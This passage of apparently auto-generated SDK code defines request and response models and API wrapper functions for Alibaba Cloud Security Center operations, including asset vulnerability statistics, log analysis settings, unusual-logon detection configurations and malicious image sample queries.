      agentlessSensitiveFile?: int32(name='AgentlessSensitiveFile', description='The number of sensitive file alerts generated by the agentless detection feature.', example='1'),
      agentlessVulCve?: int32(name='AgentlessVulCve', description='The number of system vulnerabilities detected by the agentless detection feature.', example='1'),
      agentlessVulSca?: int32(name='AgentlessVulSca', description='The number of application vulnerabilities detected by the agentless detection feature.', example='1'),
      agentlessVulSys?: int32(name='AgentlessVulSys', description='The number of Windows vulnerabilities detected by using agentless detection.', example='1'),
      appNum?: int32(name='AppNum', description='The number of application vulnerabilities detected on the asset.', example='1'),
      cmsNum?: int32(name='CmsNum', description='The number of Web-CMS vulnerabilities detected on the asset.', example='5'),
      cspmNum?: int32(name='CspmNum', description='The number of configuration risks detected on the asset.', example='1'),
      cveNum?: int32(name='CveNum', description='The number of common vulnerabilities detected on the asset.', example='1'),
      emgNum?: int32(name='EmgNum', description='The number of urgent vulnerabilities detected on the asset.', example='6'),
      health?: int32(name='Health', description='The number of baseline risks detected on the asset.', example='2'),
      scaNum?: int32(name='ScaNum', description='The number of middleware vulnerabilities detected on the asset.', example='1'),
      suspicious?: int32(name='Suspicious', description='The number of alerts generated for the asset.', example='2'),
      sysNum?: int32(name='SysNum', description='The number of Windows system vulnerabilities detected on the asset.', example='3'),
      trojan?: int32(name='Trojan', description='The number of trojans detected on the asset.', example='1'),
      uuid?: string(name='Uuid', description='The UUID of the asset.', example='6690a46c-0edb-4663-a641-3629d1a9****'),
      vul?: int32(name='Vul', description='The total number of vulnerabilities detected on the asset.', example='17'),
      weakPWNum?: int32(name='WeakPWNum', description='The number of weak passwords.', example='22'),
    }
  ](name='Data', description='The risk information about assets.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='8F035A9D-D19F-5430-8CA5-1497991B7C61'),
}

model DescribeInstanceStatisticsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeInstanceStatisticsResponseBody(name='body'),
}

/**
 * @summary Queries the statistics of assets that are protected by Security Center.
 *
 * @param request DescribeInstanceStatisticsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeInstanceStatisticsResponse
 */
async function describeInstanceStatisticsWithOptions(request: DescribeInstanceStatisticsRequest, runtime: Util.RuntimeOptions): DescribeInstanceStatisticsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeInstanceStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the statistics of assets that are protected by Security Center.
 *
 * @param request DescribeInstanceStatisticsRequest
 * @return DescribeInstanceStatisticsResponse
 */
async function describeInstanceStatistics(request: DescribeInstanceStatisticsRequest): DescribeInstanceStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeInstanceStatisticsWithOptions(request, runtime);
}

model DescribeInstanceVulStatisticsRequest {
  types?: string(name='Types', description='The vulnerability type of the serverless instance. Valid values:

*   **sca**: middleware vulnerabilities
*   **app**: application vulnerabilities detected by using a scanner

>  Serverless instances allow you to detect only application vulnerabilities by using a scanner.', example='sca,app'),
  uuid?: string(name='Uuid', description='The UUID of the instance to query.

>  You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUID of the instance.

This parameter is required.', example='5b268326-273e-44fc-a0e3-9482435c****'),
}

model DescribeInstanceVulStatisticsResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='1EE7B150-D67E-53FD-A52D-3E8E669A****'),
  vulStat?: {
    asapCount?: string(name='AsapCount', description='The number of high-risk vulnerabilities.', example='0'),
    laterCount?: string(name='LaterCount', description='The number of medium-risk vulnerabilities.', example='0'),
    nntfCount?: string(name='NntfCount', description='The number of low-risk vulnerabilities.', example='0'),
  }(name='VulStat', description='The statistics of the vulnerabilities.'),
}

model DescribeInstanceVulStatisticsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeInstanceVulStatisticsResponseBody(name='body'),
}

/**
 * @summary Queries the statistics on the vulnerabilities that are detected on a serverless instance.
 *
 * @param request DescribeInstanceVulStatisticsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeInstanceVulStatisticsResponse
 */
async function describeInstanceVulStatisticsWithOptions(request: DescribeInstanceVulStatisticsRequest, runtime: Util.RuntimeOptions): DescribeInstanceVulStatisticsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.types)) {
    query['Types'] = request.types;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeInstanceVulStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the statistics on the vulnerabilities that are detected on a serverless instance.
 *
 * @param request DescribeInstanceVulStatisticsRequest
 * @return DescribeInstanceVulStatisticsResponse
 */
async function describeInstanceVulStatistics(request: DescribeInstanceVulStatisticsRequest): DescribeInstanceVulStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeInstanceVulStatisticsWithOptions(request, runtime);
}

model DescribeLatestScanTaskResponseBody = {
  lastCheckTime?: long(name='LastCheckTime', description='The timestamp when the last check was performed. Unit: milliseconds.', example='1671610264000'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7E0618A9-D5EF-4220-9471-C42XXXXXXXX'),
  riskNum?: int32(name='RiskNum', description='The number of virus detection risks on the server.', example='1'),
  targetInfo?: string(name='TargetInfo', description='The applicable scope of the whitelist. The value of this parameter is in the JSON format and contains the following fields:

*   **type**: the type of the applicable scope. Valid values:

    *   **GroupId**: the ID of a server group
    *   **Uuid**: the UUID of a server

*   **uuids**: the UUIDs of servers

*   **groupIds**: the IDs of server groups

>  If you leave this parameter empty, all servers are added to the whitelist. If you set the **type** field to **GroupId**, you must also specify the **groupIds** field. If you set the **type** field to **Uuid**, you must also specify the **uuids** field.', example='[{"type":"uuid","name":"Host001","target":"503201a7-14c6-4280-801b-1169ed42****"}]'),
  uuids?: [ string ](name='Uuids', description='The UUIDs of the assets.'),
}

model DescribeLatestScanTaskResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeLatestScanTaskResponseBody(name='body'),
}

/**
 * @summary Queries the progress of the last virus scan task.
 *
 * @param request DescribeLatestScanTaskRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeLatestScanTaskResponse
 */
async function describeLatestScanTaskWithOptions(runtime: Util.RuntimeOptions): DescribeLatestScanTaskResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeLatestScanTask',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the progress of the last virus scan task.
 *
 * @return DescribeLatestScanTaskResponse
 */
async function describeLatestScanTask(): DescribeLatestScanTaskResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeLatestScanTaskWithOptions(runtime);
}

model DescribeLogMetaRequest {
  from?: string(name='From', description='The ID of the request source. Default value: **aegis**. Valid values:

*   **aegis**: Server Guard
*   **sas**: Security Center

>  If you use Server Guard, set the value to **aegis**. If you use Security Center, set the value to **sas**.', example='sas'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  resourceDirectoryAccountId?: long(name='ResourceDirectoryAccountId', description='The Alibaba Cloud account ID of the member in the resource directory.

>  You can call the [DescribeMonitorAccounts](~~DescribeMonitorAccounts~~) operation to obtain the IDs.', example='127608589417****'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='123.168.XX.XX'),
}

model DescribeLogMetaResponseBody = {
  logMetaList?: [ 
    {
      category?: string(name='Category', description='The category of logs. Valid values:

*   **host**
*   **network**
*   **security**', example='host'),
      hotTtl?: int32(name='HotTtl', description='The time period after which logs in hot storage are moved to cold storage. Unit: days.

>  If the value is -1, logs that are stored in hot storage are not moved to cold storage.', example='-1'),
      logDesc?: string(name='LogDesc', description='The name of the log type.', example='Login'),
      logStore?: string(name='LogStore', description='The name of the dedicated Logstore in which logs are stored.', example='aegis-log-login'),
      project?: string(name='Project', description='The name of the project.', example='aegis-log'),
      status?: string(name='Status', description='The status of the log analysis feature. Valid values:

*   **disabled**
*   **enabled**', example='enabled'),
      topic?: string(name='Topic', description='The topic of logs that are delivered.', example='aegis-log-login'),
      ttl?: int32(name='Ttl', description='The number of days during which logs can be retained.', example='180'),
      userLogStore?: string(name='UserLogStore', description='The name of the dedicated Logstore in which user logs are stored.', example='aegis-log-network'),
      userProject?: string(name='UserProject', description='The name of the dedicated project in which logs are stored.', example='sasnew-log-XXXX-cn-hangzhou'),
      userRegion?: string(name='UserRegion', description='The ID of the region.', example='cn-hangzhou'),
    }
  ](name='LogMetaList', description='An array that consists of the configurations of the log analysis feature.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='D0D6E6E4-CB8C-4897-B852-46AEFDA04B21'),
  totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='100'),
}

model DescribeLogMetaResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeLogMetaResponseBody(name='body'),
}

/**
 * @summary Queries the configurations of the log analysis feature provided by Security Center.
 *
 * @param request DescribeLogMetaRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeLogMetaResponse
 */
async function describeLogMetaWithOptions(request: DescribeLogMetaRequest, runtime: Util.RuntimeOptions): DescribeLogMetaResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.resourceDirectoryAccountId)) {
    query['ResourceDirectoryAccountId'] = request.resourceDirectoryAccountId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeLogMeta',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the configurations of the log analysis feature provided by Security Center.
 *
 * @param request DescribeLogMetaRequest
 * @return DescribeLogMetaResponse
 */
async function describeLogMeta(request: DescribeLogMetaRequest): DescribeLogMetaResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeLogMetaWithOptions(request, runtime);
}

model DescribeLogShipperStatusRequest {
  from?: string(name='From', description='The ID of the request source. Set the value to **sas**.', example='sas'),
}

model DescribeLogShipperStatusResponseBody = {
  logShipperStatus?: {
    authStatus?: string(name='AuthStatus', description='Indicates whether Security Center is authorized to access Log Service. Valid values:

*   **yes**
*   **no**', example='yes'),
    buyStatus?: string(name='BuyStatus', description='Indicates whether the log analysis feature is purchased. Valid values:

*   **yes**
*   **no**', example='yes'),
    etlMetaVersion?: string(name='EtlMetaVersion', description='The version of the log analysis field. Valid values:
- SAS_V1
- SAS_V2', example='SAS_V1'),
    openStatus?: string(name='OpenStatus', description='The status of the log analysis feature. Valid values:

*   **yes**: enabled
*   **no**: disabled', example='yes'),
    postPaidOpenStatus?: string(name='PostPaidOpenStatus', description='Indicates whether the pay-as-you-go billing method is used. Valid values:

*   **yes**
*   **no**', example='no'),
    postPaidSupportStatus?: string(name='PostPaidSupportStatus', description='Indicates whether the log analysis feature supports the pay-as-you-go billing method. Valid values:

*   **yes**
*   **no**', example='yes'),
    slsProjectStatus?: string(name='SlsProjectStatus', description='The status of the dedicated Log Service project. Valid values:

*   **Normal**: normal
*   **Disable**: disabled', example='Normal'),
    slsServiceStatus?: string(name='SlsServiceStatus', description='Indicates whether Log Service is activated. Valid values:

*   **yes**
*   **no**', example='yes'),
  }(name='LogShipperStatus', description='The status information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='24A20733-10A0-4AF6-BE6B-E3322413****'),
}

model DescribeLogShipperStatusResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeLogShipperStatusResponseBody(name='body'),
}

/**
 * @summary Queries the status information about the log analysis feature.
 *
 * @param request DescribeLogShipperStatusRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeLogShipperStatusResponse
 */
async function describeLogShipperStatusWithOptions(request: DescribeLogShipperStatusRequest, runtime: Util.RuntimeOptions): DescribeLogShipperStatusResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeLogShipperStatus',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the status information about the log analysis feature.
 *
 * @param request DescribeLogShipperStatusRequest
 * @return DescribeLogShipperStatusResponse
 */
async function describeLogShipperStatus(request: DescribeLogShipperStatusRequest): DescribeLogShipperStatusResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeLogShipperStatusWithOptions(request, runtime);
}

model DescribeLoginBaseConfigsRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **5**.', example='5'),
  target?: string(name='Target', description='The server to which the configuration is applied. The value of this parameter is in the JSON format and contains the following fields:

*   **Target**: the UUID or group ID of the server to add or delete.

> If targetType is set to uuid, the value of Target is the UUID of the server. If targetType is set to groupId, the value of Target is the group ID of the server. If targetType is set to global, the value of Target is a hyphen (-).

*   **targetType**: the type of the server to which the configuration is applied. Valid values:

    *   **uuid**: a server
    *   **groupId**: a server group
    *   **global**: all servers', example='[ {"target": "inet-7c676676-06fa-442e-90fb-b802e5d6****", "targetType": "uuid" } ]'),
  type?: string(name='Type', description='The logon type of the configuration to query. Valid values:

*   **login_common_location**: common logon location
*   **login_common_ip**: common logon IP address
*   **login_common_time**: common logon time range
*   **login_common_account**: common logon account

This parameter is required.', example='login_common_location'),
}

model DescribeLoginBaseConfigsResponseBody = {
  baseConfigs?: [ 
    {
      account?: string(name='Account', description='The common logon account.', example='1582318****'),
      endTime?: string(name='EndTime', description='The end time of the common logon time range.', example='07:00'),
      ip?: string(name='Ip', description='The common logon IP address.', example='192.168.XX.XX'),
      location?: string(name='Location', description='The common logon location.', example='Montenegro'),
      remark?: string(name='Remark', description='Corresponding configuration remark information.', example='test'),
      startTime?: string(name='StartTime', description='The start time of the common logon time range.', example='08:00'),
      targetList?: [ 
        {
          target?: string(name='Target', description='The UUID or group ID of the server.', example='0011ea53-738c-4bff-93be-ce6a1cc9****'),
          targetType?: string(name='TargetType', description='The type of the server to which the configuration is applied. Valid values:

*   **uuid**: a server
*   **groupId**: a server group
*   **global**: all servers', example='uuid'),
        }
      ](name='TargetList', description='The details of the servers to which the configuration is applied.'),
      totalCount?: int32(name='TotalCount', description='The total number of servers.', example='172'),
      uuidCount?: int32(name='UuidCount', description='The number of servers to which the configuration is applied.', example='13'),
    }
  ](name='BaseConfigs', description='The description of the configuration.'),
  currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **20**.', example='20'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='2C2D4B3C-0524-17B1-93D2-DA50119F4E1E'),
  totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='200'),
}

model DescribeLoginBaseConfigsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeLoginBaseConfigsResponseBody(name='body'),
}

/**
 * @summary Queries the information about the configurations that are used to detect unusual logons to your servers.
 *
 * @param request DescribeLoginBaseConfigsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeLoginBaseConfigsResponse
 */
async function describeLoginBaseConfigsWithOptions(request: DescribeLoginBaseConfigsRequest, runtime: Util.RuntimeOptions): DescribeLoginBaseConfigsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.target)) {
    query['Target'] = request.target;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeLoginBaseConfigs',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the information about the configurations that are used to detect unusual logons to your servers.
 *
 * @param request DescribeLoginBaseConfigsRequest
 * @return DescribeLoginBaseConfigsResponse
 */
async function describeLoginBaseConfigs(request: DescribeLoginBaseConfigsRequest): DescribeLoginBaseConfigsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeLoginBaseConfigsWithOptions(request, runtime);
}

model DescribeLoginSwitchConfigsResponseBody = {
  configList?: [ 
    {
      item?: string(name='Item', description='The type of the alert that you enabled or disabled. Valid values:

*   **login_common_ip**: alerts for unapproved logon IP addresses
*   **login_common_time**: alerts for unapproved logon time ranges
*   **login_common_account**: alerts for unapproved logon accounts', example='login_common_ip'),
      status?: int32(name='Status', description='The status of the Log Service feature. Valid values:

*   **0**: The feature is disabled.
*   **1**: The feature is enabled.', example='0'),
    }
  ](name='ConfigList', description='The configuration item returned.'),
  count?: int32(name='Count', description='The number of returned configuration items.', example='2'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='0B48AB3C-84FC-424D-A01D-B9270EF4****'),
}

model DescribeLoginSwitchConfigsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeLoginSwitchConfigsResponseBody(name='body'),
}

/**
 * @summary Queries the alerting status for unapproved logon IP addresses, unapproved logon time ranges, or unapproved logon accounts.
 *
 * @param request DescribeLoginSwitchConfigsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeLoginSwitchConfigsResponse
 */
async function describeLoginSwitchConfigsWithOptions(runtime: Util.RuntimeOptions): DescribeLoginSwitchConfigsResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeLoginSwitchConfigs',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the alerting status for unapproved logon IP addresses, unapproved logon time ranges, or unapproved logon accounts.
 *
 * @return DescribeLoginSwitchConfigsResponse
 */
async function describeLoginSwitchConfigs(): DescribeLoginSwitchConfigsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeLoginSwitchConfigsWithOptions(runtime);
}

model DescribeLogstoreStorageRequest {
  from?: string(name='From', description='The ID of the request source. Set the value to **sas**.

This parameter is required.', example='sas'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
}

model DescribeLogstoreStorageResponseBody = {
  logstore?: string(name='Logstore', description='The name of the dedicated Logstore that is used to store full logs of Security Center. The value is fixed as **sas-log**.', example='sas-log'),
  preserve?: long(name='Preserve', description='The purchased log storage capacity, in GB.', example='12240'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='25EC270F-5783-4416-AD7C-1EDF063A039C'),
  ttl?: int32(name='Ttl', description='The number of days during which logs can be retained. The value is fixed as **180**, which indicates that logs can be retained for 180 days.

>  You are not allowed to change the value of this parameter.', example='180'),
  used?: long(name='Used', description='The used log storage capacity, in GB.', example='335'),
  userProject?: string(name='UserProject', description='The name of the dedicated Project that is used to store full logs of Security Center.', example='sas-log-XXXX-cn-hangzhou'),
}

model DescribeLogstoreStorageResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeLogstoreStorageResponseBody(name='body'),
}

/**
 * @summary Queries the purchased log storage capacity.
 *
 * @param request DescribeLogstoreStorageRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeLogstoreStorageResponse
 */
async function describeLogstoreStorageWithOptions(request: DescribeLogstoreStorageRequest, runtime: Util.RuntimeOptions): DescribeLogstoreStorageResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeLogstoreStorage',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the purchased log storage capacity.
 *
 * @param request DescribeLogstoreStorageRequest
 * @return DescribeLogstoreStorageResponse
 */
async function describeLogstoreStorage(request: DescribeLogstoreStorageRequest): DescribeLogstoreStorageResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeLogstoreStorageWithOptions(request, runtime);
}

model DescribeMachineCanRebootRequest {
  type?: string(name='Type', description='The type of the vulnerabilities. Valid values:

*   cve: Linux software vulnerabilities
*   sys: Windows system vulnerabilities', example='sys'),
  uuid?: string(name='Uuid', description='The UUID of the server.', example='5b268326-273e-44fc-a0e3-9482435c****'),
}

model DescribeMachineCanRebootResponseBody = {
  canReboot?: boolean(name='CanReboot', description='Indicates whether the server can be restarted. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='79CFF74D-E967-5407-8A78-EE03B925FDAA'),
}

model DescribeMachineCanRebootResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeMachineCanRebootResponseBody(name='body'),
}

/**
 * @summary Queries whether a server can be restarted after the vulnerabilities on the server are fixed. The fixes take effect only after the server is restarted.
 *
 * @param request DescribeMachineCanRebootRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeMachineCanRebootResponse
 */
async function describeMachineCanRebootWithOptions(request: DescribeMachineCanRebootRequest, runtime: Util.RuntimeOptions): DescribeMachineCanRebootResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeMachineCanReboot',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries whether a server can be restarted after the vulnerabilities on the server are fixed. The fixes take effect only after the server is restarted.
 *
 * @param request DescribeMachineCanRebootRequest
 * @return DescribeMachineCanRebootResponse
 */
async function describeMachineCanReboot(request: DescribeMachineCanRebootRequest): DescribeMachineCanRebootResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeMachineCanRebootWithOptions(request, runtime);
}

model DescribeMatchedMaliciousNamesRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  levels?: string(name='Levels', description='The severity of the malicious image sample that you want to query. You can enter multiple severities. Separate the severities with commas (,). Valid values:

*   **serious**
*   **suspicious**
*   **remind**', example='serious'),
}

model DescribeMatchedMaliciousNamesResponseBody = {
  count?: int32(name='Count', description='The number of entries on the current page.', example='1'),
  data?: [ 
    {
      displayName?: string(name='DisplayName', description='The display name of the malicious image sample type.', example='displayname'),
      key?: string(name='Key', description='The key of the malicious image sample type.', example='key'),
    }
  ](name='Data', description='The response parameters.'),
  requestId?: string(name='RequestId', description='The request ID.', example='C7CD1BE6-97A2-5524-A529-B55C63E55D59'),
}

model DescribeMatchedMaliciousNamesResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeMatchedMaliciousNamesResponseBody(name='body'),
}

/**
 * @summary Queries a list of malicious image sample types.
 *
 * @param request DescribeMatchedMaliciousNamesRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeMatchedMaliciousNamesResponse
 */
async function describeMatchedMaliciousNamesWithOptions(request: DescribeMatchedMaliciousNamesRequest, runtime: Util.RuntimeOptions): DescribeMatchedMaliciousNamesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.levels)) {
    query['Levels'] = request.levels;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeMatchedMaliciousNames',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries a list of malicious image sample types.
 *
 * @param request DescribeMatchedMaliciousNamesRequest
 * @return DescribeMatchedMaliciousNamesResponse
 */
async function describeMatchedMaliciousNames(request: DescribeMatchedMaliciousNamesRequest): DescribeMatchedMaliciousNamesResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeMatchedMaliciousNamesWithOptions(request, runtime);
}

model DescribeModuleConfigResponseBody = {
  count?: int32(name='Count', description='The number of configurations for the module.', example='2'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code.', example='200'),
  moduleConfigList?: [ 
    {
      configName?: string(name='ConfigName', description='The name of the configuration.', example='timescan'),
      items?: [ 
        {
          groupId?: int32(name='GroupId', description='The ID of the server group.', example='173'),
          instanceId?: string(name='InstanceId', description='The ID of the server.', example='i-uf6435dn4t59b9av****'),
          instanceName?: string(name='InstanceName', description='The name of the server.', example='inStanceName****'),
          ip?: string(name='Ip', description='The IP address of the server.', example='31.13.XX.XX'),
          region?: string(name='Region', description='The region in which the server resides.', example='cn-hangzhou'),
          uuid?: string(name='Uuid', description='The UUID of the server.', example='a47e3713-ed22-4015-93a3-d88ebe6****'),
        }
      ](name='Items', description='An array that consists of the configuration items.'),
      moduleName?: string(name='ModuleName', description='The name of the module.', example='alihids'),
    }
  ](name='ModuleConfigList', description='An array that consists of the configurations of the module.'),
  requestId?: string(name='RequestId', description='The request ID.', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
}

model DescribeModuleConfigResponse = {
